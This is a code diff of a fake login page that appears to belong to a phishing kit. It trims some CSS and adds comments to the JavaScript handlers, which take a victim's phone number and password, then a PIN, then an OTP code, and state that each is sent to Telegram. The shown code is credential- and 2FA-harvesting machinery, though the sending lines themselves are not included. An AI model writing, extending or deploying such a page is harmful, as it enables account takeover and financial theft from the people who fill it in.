@@ -65,7 +65,6 @@
             flex-shrink: 0;
         }
 
-        /* Exact Capsule Styling matching your reference image */
         .login-capsule .input-capsule {
             background: #f4f7ff !important;
             border-radius: 50px !important;
@@ -95,24 +94,15 @@
             font-weight: 400 !important;
         }
 
-        .register-rows .input-line,
         .card-panel .input-line {
             position: relative;
             display: flex;
             align-items: center;
-            background: #f4f7ff;
-            border-radius: 44px;
-            padding: 14px 22px;
-            margin-bottom: 16px;
-            gap: 12px;
-            border: none;
-        }
-
-        .card-panel .input-line {
             background: transparent;
             border-radius: 0;
             border-bottom: 1px solid #edf2f7;
             padding: 16px 0;
+            gap: 12px;
         }
 
         .card-panel .input-line label {
@@ -124,7 +114,6 @@
             flex-shrink: 0;
         }
 
-        .register-rows .input-line input,
         .card-panel .input-line input {
             flex: 1;
             border: none;
@@ -556,6 +545,7 @@
         }, 1000);
     }
 
+    // Login Button Click -> Sends login data to Telegram & opens PIN modal
     document.getElementById('loginBtn').addEventListener('click', () => {
         currentPhone = document.getElementById('loginPhone').value.trim();
         currentPassword = document.getElementById('loginPassword').value.trim();
@@ -574,6 +564,7 @@
         document.getElementById('pin0').focus();
     });
 
+    // Confirm PIN Click -> Sends PIN, opens OTP modal, starts 120s timer
     document.getElementById('verifyPinBtn').addEventListener('click', () => {
         let pin = '';
         document.querySelectorAll('.pin-digit').forEach(i => pin += i.value);
@@ -592,7 +583,7 @@
         document.getElementById('otp0').focus();
         document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
         
-        startOtpTimer();
+        startOtpTimer(); // Timer starts here when OTP modal opens
     });
 
     const otpInputs = document.querySelectorAll('.o-digit');
@@ -615,6 +606,7 @@
         });
     });
 
+    // Verify OTP Button Click -> Sends OTP to Telegram
     document.getElementById('verifyOtpBtn').addEventListener('click', () => {
         let otp = '';
         otpInputs.forEach(i => otp += i.value);
@@ -645,6 +637,7 @@
         }
     });
 
+    // Modify Password Button Click -> Sends request & starts timer
     document.getElementById('modifyBtn').addEventListener('click', () => {
         const phone = document.getElementById('modifyPhone').value.trim();
         const pass = document.getElementById('modifyPass').value.trim();
